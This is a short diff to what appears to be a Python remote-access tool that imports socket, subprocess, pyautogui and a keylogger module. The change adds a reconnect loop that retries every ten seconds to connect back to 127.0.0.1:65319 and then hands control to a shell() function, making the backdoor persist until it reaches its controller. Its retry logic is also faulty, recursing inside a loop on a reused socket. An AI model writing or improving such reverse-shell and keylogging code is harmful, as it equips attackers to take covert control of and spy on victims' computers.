@@ -6,6 +6,8 @@
 """
 
 import socket, subprocess, os, sys, threading, shutil
+import time
+
 import pyautogui
 import keylogger
 
@@ -99,8 +101,18 @@ def shell():
 
     s.close()
 
+def connection():
+    while True:
+        time.sleep(10)
+        try:
+            s.connect(("127.0.0.1", 65319))
+            shell()
+            break
+        except:
+            connection()
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("127.0.0.1", 65319))
-shell()
+connection()
+
 
 
